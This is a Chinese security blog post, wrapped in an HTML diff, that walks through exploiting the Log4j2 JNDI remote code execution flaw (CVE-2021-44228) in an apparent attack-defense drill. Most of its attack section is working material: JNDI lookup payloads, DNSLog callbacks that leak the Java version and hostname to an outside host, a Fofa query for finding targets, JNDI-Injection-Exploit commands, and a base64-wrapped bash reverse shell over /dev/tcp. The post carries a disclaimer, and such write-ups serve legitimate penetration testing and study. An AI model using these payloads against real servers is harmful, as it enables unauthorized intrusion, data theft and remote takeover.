@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cgw-f.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)免责声明 ​        本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2远程代码执行漏洞">
+<meta property="og:url" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="北极星上的稻草人">
+<meta property="og:description" content="攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)免责声明 ​        本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160426173.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160521214.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160618760.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160656674.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160712160.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160945900.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161528633.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161614950.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161731226.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161804839.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161946277.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162123513.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162150589.png">
+<meta property="og:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162206545.png">
+<meta property="article:published_time" content="2023-08-14T06:24:33.000Z">
+<meta property="article:modified_time" content="2023-08-14T13:02:02.482Z">
+<meta property="article:author" content="北极星上的稻草人">
+<meta property="article:tag" content="实战漏洞">
+<meta property="article:tag" content="攻防演练">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160426173.png">
+
+<link rel="canonical" href="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Log4j2远程代码执行漏洞 | 北极星上的稻草人</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">北极星上的稻草人</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">稻草人笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">84</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Log4j2远程代码执行漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-14 14:24:33 / 修改时间：21:02:02" itemprop="dateCreated datePublished" datetime="2023-08-14T14:24:33+08:00">2023-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="攻防演练-Log4j2远程代码执行漏洞-cve-2021-44228"><a href="#攻防演练-Log4j2远程代码执行漏洞-cve-2021-44228" class="headerlink" title="攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)"></a>攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)</h1><p><strong>免责声明</strong></p>
+<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
+<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​        Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p>
+<p><strong>漏洞所在</strong>：log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p>
+<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>原理概述</p>
+<ul>
+<li><p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p>
+</li>
+<li><p>假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp</p>
+</li>
+<li><p>解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找</p>
+</li>
+<li><p>在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入</p>
+</li>
+<li><p>攻击者就可以通过shell实现任意的命令执行，造成严重危害</p>
+</li>
+</ul>
+<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>Fofa：</strong>app=”Log4j2”</p>
+<p><strong>漏洞条件</strong></p>
+<ul>
+<li>Apache Log4j 2.x &lt;= 2.14.1</li>
+<li> Apache Log4j2 2.15.0-rc1（补丁绕过）</li>
+<li>JDK版本小于8u191，7u201,6u211</li>
+</ul>
+<p>初步判断方法：</p>
+<p>搜索已知 ip=”x.x.x.x” &amp;&amp; app=”Log4j2”</p>
+<p>如有结果，则代表疑似有风险。</p>
+<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p><strong>整个攻击链：</strong></p>
+<p><strong>攻击者在漏洞点注入表达式如${jndi:ldap://xxx.xxx.xxx/exploit}</strong> </p>
+<p><strong>→ 然后log4j2支持lookup（）方法</strong> </p>
+<p><strong>→ log4j2支持JNDI à  ldap/rmi 远程加载攻击者服务器上的class文件构建对象（LDAP/RMI中有个命名引用功能）</strong> </p>
+<p><strong>→ 寻找本地的恶意代码并执行。</strong></p>
+<h3 id="Dnslog出网测试"><a href="#Dnslog出网测试" class="headerlink" title="Dnslog出网测试"></a>Dnslog出网测试</h3><p><strong>【payload】</strong></p>
+<p><code>action=$&#123;jndi:ldap://X.X.X.X/exp&#125;</code></p>
+<p><code>action=$&#123;jndi:ldap:// nlhkzw.dnslog.cn &#125;</code></p>
+<p>​        先获取一个dnslog的子域名（ceye等平台的子域名也可以），并在靶机中进行ldap请求，获取DNSLog.cn子域名：<strong>nlhkzw.dnslog.cn</strong>。</p>
+<p>​     <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160426173.png" alt="image-20230814160426173"></p>
+<p>抓包并注入payload</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160521214.png" alt="image-20230814160521214"></p>
+<p>对payload 进行url编码</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160618760.png" alt="image-20230814160618760"></p>
+<p>编码后放包</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160656674.png" alt="image-20230814160656674"></p>
+<p>​        在DNSLog网站成功接收到解析记录即代表存在漏洞；DNSLog.cn站点用的人多，网络慢，可以需要刷新几次或等待一会才会有回显。（有的流量检测工具会记录常见DNS网站特征，对改网站进行封禁，所以即使有漏洞也不会有回显，这种情况就需要自己搭建域名服务器检验）</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160712160.png" alt="image-20230814160712160"></p>
+<p><strong>通过dnslog获取java版本信息</strong></p>
+<p><strong>【payload】</strong></p>
+<p><code>action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;. nlhkzw.dnslog.cn &#125;</code></p>
+<p><code>action=$&#123;jndi:ldap://$&#123;env:HOSTNAME&#125;. nlhkzw.dnslog.cn &#125;</code></p>
+<p>执行同上操作（注入payload），回显结果</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814160945900.png" alt="image-20230814160945900"></p>
+<h3 id="JNDI注入远程命令执行"><a href="#JNDI注入远程命令执行" class="headerlink" title="JNDI注入远程命令执行"></a>JNDI注入远程命令执行</h3><p><strong>JNDI注入工具</strong>：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<ul>
+<li> <strong>生成payload</strong></li>
+</ul>
+<p>​        可执行程序为jar包，在命令行中运行以下命令（命令会被作为参数传入Runtime.getRuntime().exec()函数中），生成恶意的JNDI Links。</p>
+<p><strong>【payload】</strong> </p>
+<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [攻击者address]</code></p>
+<p>在命令框输入如下：</p>
+<p><code>root@kali：~# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A **恶意服务器ip/****攻击者ip**</code></p>
+<p><code>[ADDRESS] &gt;&gt; **恶意ladp/rmi****服务器ip/****攻击者ip**</code></p>
+<p><code>[COMMAND] &gt;&gt; touch /tmp/success（远程执行命令）</code></p>
+<p>输入完成会获取到payload，（根据靶机不同版本用不同payload）</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161528633.png" alt="image-20230814161528633"></p>
+<ul>
+<li><strong>远程命令执行</strong></li>
+</ul>
+<p>​        使用JDK 1.8的链接，将其作为JNDI查询的对象，从而使得靶机（被攻击机）访问ldap服务，下载恶意的class文件。</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161614950.png" alt="image-20230814161614950"></p>
+<ul>
+<li><p><strong>查看攻击结果</strong></p>
+<p>​    被攻击电脑的/tmp/目录下会生成success文件</p>
+</li>
+</ul>
+<h3 id="JNDI注入反弹shell"><a href="#JNDI注入反弹shell" class="headerlink" title="JNDI注入反弹shell"></a>JNDI注入反弹shell</h3><p>先验证log4j漏洞是否存在，若存在才可以利用。</p>
+<ul>
+<li><strong>生成payload1</strong></li>
+</ul>
+<p>命令执行Payload：<code>bash -i &gt;&amp; /dev/tcp/v-ip/port 0&gt;&amp;1</code></p>
+<p>​        根据上述paylaod填充v-ip和端口信息，v-ip是攻击者接收反弹shell结果的ip，然后对其进行base64编码。</p>
+<p> <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161731226.png" alt="image-20230814161731226"></p>
+<ul>
+<li><strong>设置监听端口</strong></li>
+</ul>
+<p>在 v-ip中打开一个页面，监听我们的对应的端口。</p>
+<p> <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161804839.png" alt="image-20230814161804839"></p>
+<ul>
+<li> <strong>执行EXP，生成可用的payload</strong></li>
+</ul>
+<p>编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：</p>
+<p><strong>【payload】</strong></p>
+<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,<strong>payload1</strong>}|{base64,-d}|{bash,-i}” -A <strong>靶机ip（被攻击者ip）</strong></p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814161946277.png" alt="image-20230814161946277"></p>
+<ul>
+<li> <strong>反弹shell</strong></li>
+</ul>
+<p>​         <strong>剩下的操作同远程命令执行攻击方式。使用burpsuit抓包，替换上面生成的payload</strong>，rmi://ip:1099/xz4mwn 到Burpsuite：</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162123513.png" alt="image-20230814162123513"></p>
+<p>Base64编码后再放包</p>
+<p><img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162150589.png" alt="image-20230814162150589"></p>
+<p>反弹shell成功 <img src="/2023/08/14/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230814162206545.png" alt="image-20230814162206545"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" rel="tag"># 实战漏洞</a>
+              <a href="/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" rel="tag"># 攻防演练</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/14/%E5%90%AF%E8%8E%B1OA%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5/" rel="prev" title="启莱OA系统SQL注入">
+      <i class="fa fa-chevron-left"></i> 启莱OA系统SQL注入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/" rel="next" title="404页面利用">
+      404页面利用 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83-Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228"><span class="nav-number">1.</span> <span class="nav-text">攻防演练|Log4j2远程代码执行漏洞(cve-2021-44228)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">0x01漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%88%96%E6%8C%87%E7%BA%B9"><span class="nav-number">1.3.</span> <span class="nav-text">0x03漏洞环境或指纹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-POC-EXP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 POC&#x2F;EXP&#x2F;漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dnslog%E5%87%BA%E7%BD%91%E6%B5%8B%E8%AF%95"><span class="nav-number">1.4.1.</span> <span class="nav-text">Dnslog出网测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.4.2.</span> <span class="nav-text">JNDI注入远程命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.4.3.</span> <span class="nav-text">JNDI注入反弹shell</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<!-- 页面动态背景 -->
+
